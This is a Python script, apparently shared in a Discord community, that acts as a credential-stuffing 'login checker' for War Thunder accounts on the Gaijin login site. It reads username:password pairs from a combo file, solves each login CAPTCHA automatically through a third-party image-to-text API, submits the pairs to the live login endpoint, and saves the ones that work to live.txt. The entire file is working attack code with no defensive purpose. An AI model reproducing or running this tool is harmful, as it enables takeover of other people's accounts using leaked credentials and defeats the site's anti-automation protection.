import requests
import base64

# this code maded by: discord.gg/apiland

# this script sends a base64 encoded image [Captcha] to a local server for captcha solving for warthunder login checker.


def solve_captcha(base64_data):
    url = "https://image-to-text38.p.rapidapi.com/captcha"
    payload = { "image": base64_data }
    headers = {
        "x-rapidapi-key": "AddYourApiKeyHere",
        "x-rapidapi-host": "image-to-text38.p.rapidapi.com",
        "Content-Type": "application/json"
    }
    response = requests.post(url, json=payload, headers=headers)
    result = response.json()
    return result.get("text", "")

def warthunder():
    with open("combo.txt", "r", encoding="utf-8") as f:
        combos = [line.strip() for line in f if line.strip()]

    for combo in combos:
        if ':' not in combo or combo.count(':') != 1:
            print(f"Format uygunsuz: {combo}")
            continue
        user, password = combo.split(':', 1)
        r = requests.session()

        getcaptcha = r.get("https://login.gaijin.net/tr/?error=recap")
        try:
            getcpt = getcaptcha.text.split('<img class="sso-captcha__img" id="captcha-img" src="')[1].split('"')[0]
        except Exception:
            print(f"{user}:{password} -> Captcha bulunamadı, atlanıyor.")
            continue

        captchaget = r.get(f"https://login.gaijin.net{getcpt}")
        captcha_base64 = base64.b64encode(captchaget.content).decode()

        captcha_text = solve_captcha(captcha_base64)
        print(f"{user}:{password} -> Captcha: {captcha_text}")

        post = r.post("https://login.gaijin.net/tr/sso/login/procedure/", data={
            "login": user,
            "password": password,
            "captcha": captcha_text,
            "action": "",
            "referer": "",
            "fingerprint": "7fa5ec13d8b16a15d0be61300c01d199",
            "app_id": ""
        })
        if "Hatalı Doğrulama Kodu" in post.text:
            print(f"{user}:{password} -> Captcha solve failed.")
        elif "Hesabınız donduruldu." in post.text:
            print(f"{user}:{password} -> Hesap dondurulmuş.")
        elif "Geçersiz giriş ya da şifre!" in post.text:
            print(f"{user}:{password} -> Geçersiz giriş ya da şifre.")
        else:
            print(f"{user}:{password} -> Giriş başarılı!")
            with open("live.txt", "a", encoding="utf-8") as lf:
                lf.write(f"{user}:{password}\n")
        

warthunder()